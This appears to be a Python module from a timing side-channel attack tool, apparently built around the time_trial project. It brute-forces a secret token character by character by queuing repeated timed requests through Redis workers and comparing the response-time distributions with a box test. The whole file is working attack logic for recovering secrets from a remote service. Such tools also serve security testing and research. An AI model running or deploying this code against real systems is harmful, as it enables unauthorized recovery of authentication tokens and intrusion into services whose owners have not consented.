import time

from rq import Queue
from redis import Redis

from lib.box_test import BoxTest
from lib.trial_jobs import job_factory
from lib.racer_driver.execute_trial import execute_trial
from lib.timing_data import TimingData

TEMPLATE_VAR = '$TIME_TRIAL$'


class AttackException(Exception):
    pass


class TimeAttack(object):
    def __init__(self,
                 trial=None,
                 accepted_charset=None,
                 valid_token=None,
                 start_after=None,
                 on_log_message=None,
                 on_new_char_found=None,
                 bruteforce_last_chars=False,
                 lower_quantile=6.0,
                 upper_quantile=6.5):

        self.trial = trial
        self.accepted_charset = accepted_charset
        self.valid_token = valid_token
        self.start_after = start_after
        self.on_log_message = on_log_message
        self.on_new_char_found = on_new_char_found
        self.bruteforce_last_chars = bruteforce_last_chars
        self.lower_quantile = lower_quantile
        self.upper_quantile = upper_quantile

        assert self.trial is not None, 'Trial must be set'
        assert self.accepted_charset is not None, 'Accepted charset must be set'
        assert self.valid_token is not None, 'Valid token must be set'

        assert self.start_after is not None, 'Start after must be set'
        assert self.start_after > 0, 'Start after must be an integer'

        self.known_chars = self.valid_token[:self.start_after]

        self.guessed_one_char = False

        # Required to queue trials
        self.redis_conn = Redis()

    @property
    def missing_chars(self):
        return len(self.valid_token) - len(self.known_chars)

    def log_message(self, message):
        if self.on_log_message:
            self.on_log_message(message)

    def new_char_found(self, char):
        self.known_chars += char

        # We did find this char "legally", without any guessing.
        self.guessed_one_char = False

        if self.on_new_char_found:
            self.on_new_char_found(char)

    def run(self):
        """
        Run several trials to retrieve timing information and brute-force the
        token char by char.

        :see: https://github.com/dmayer/time_trial/issues/2
        :return: The token we retrieved using the timing attack
        """
        while self.missing_chars:

            # TODO: Algorithm weakness! We're comparing all the timing data
            #       against the first character. The remote system load might
            #       change a lot between the first and N'th char we test
            self.log_message('Getting baseline character timing...')
            first_accepted = self.accepted_charset[0]
            timing_data_first = self.get_timing_data(first_accepted)
            timing_data_first.char = first_accepted

            # TODO: Ideally all tests should be run at the same time to account
            #       for changing remote system load
            for char in self.accepted_charset[1:]:
                timing_data = self.get_timing_data(char)
                timing_data.char = char

                winning_data = self.get_slowest(timing_data, timing_data_first)

                if winning_data is not None:
                    winning_char = winning_data.char

                    self.log_message('New character found: %s' % winning_char)
                    self.new_char_found(winning_char)

                    break
            else:
                # Ouch! We get here when none of the chars we tested showed a
                # slower response. This means one of:
                #
                #   * All the characters are valid for this position
                #
                #   * None of the characters are valid for this position
                #
                #   * The time measurement failed (noise, jitter, etc.)
                #
                # AFAIK there is no way to tell in which case we're without
                # doing more testing.

                if self.guessed_one_char:
                    # We only want to guess one character, if we get here
                    # for a second time (in a row) we're going to return
                    return self.known_chars[:-1]

                # Guess and continue
                args = (len(self.known_chars), first_accepted)
                msg = ('Failed to time-attack char #%s. Setting it to an'
                       ' arbitrary character (%s) and trying to time-attack'
                       ' next char.')
                self.log_message(msg % args)

                # We want to do this only once
                self.known_chars += first_accepted
                self.guessed_one_char = True

        return self.known_chars

    def get_slowest(self, timing_data_a, timing_data_b):
        """
        :param timing_data_a: A TimingData instance
        :param timing_data_b: A TimingData instance
        :return: The slowest timing data, None if there is no difference between
                 them.
        """
        # Are the two distributions distinct?
        box_test = BoxTest(timing_data_a,
                           timing_data_b,
                           self.lower_quantile,
                           self.upper_quantile)

        # Now that I know that they are distinct I need to define which one is
        # the slowest one
        if box_test.are_distinct():
            args = (self.known_chars + timing_data_a.char,
                    self.known_chars + timing_data_b.char)
            self.log_message('Timing for %s is different from %s' % args)

            slowest = box_test.get_lowest()
            fastest = timing_data_a if timing_data_b is slowest else timing_data_b
            args = (self.known_chars + slowest.char,
                    self.known_chars + fastest.char)
            self.log_message('Timing for %s is slower than %s' % args)
            return slowest

        args = (self.known_chars + timing_data_a.char,
                self.known_chars + timing_data_b.char)
        self.log_message('Timing for %s and %s is the same' % args)
        return None

    def get_timing_data(self, char):
        """
        Append the `char` to the known_chars, run a trial and retrieve the
        timing data.

        :param char: The character to test
        :return: A TimingData instance
        """
        # TODO: self.trial is not thread safe
        request_template = self.trial.request

        test_token = self.known_chars + char
        test_token = test_token.ljust(len(self.valid_token),
                                      self.accepted_charset[0])
        test_request = request_template.replace(TEMPLATE_VAR, test_token)

        self.log_message('Timing %s ...' % test_token)

        job = job_factory(self.trial)
        job.reps = self.trial.reps
        job.core_affinity = self.trial.core_id
        job.request = test_request

        if self.trial.real_time:
            job.real_time = 1
        else:
            job.real_time = 0

        rq_job = self.enqueue_job(job)
        job_id = rq_job.get_id()
        self.log_message('Waiting for trial with Job ID %s to finish...' % job_id)

        timing_data = None

        while True:
            self.sleep(1)

            if rq_job.result is None:
                self.log_message('Job %s is running...' % job_id)
            else:
                self.log_message('Job %s finished!' % job_id)

                timing_data = TimingData()
                timing_data.parse_csv(rq_job.result)
                break

        if timing_data and not timing_data.data:
            raise AttackException('Timing data is empty. Unexpected error!')

        return timing_data

    def sleep(self, delay):
        time.sleep(delay)

    def enqueue_job(self, job):
        """
        Mostly a helper for unittest

        :param job: A job to queue
        :return: The rq job instance
        """
        q = Queue(self.trial.racer.hostname, connection=self.redis_conn)
        return q.enqueue_call(func=execute_trial, args=(job,),
                              result_ttl=-1, timeout=1000000)
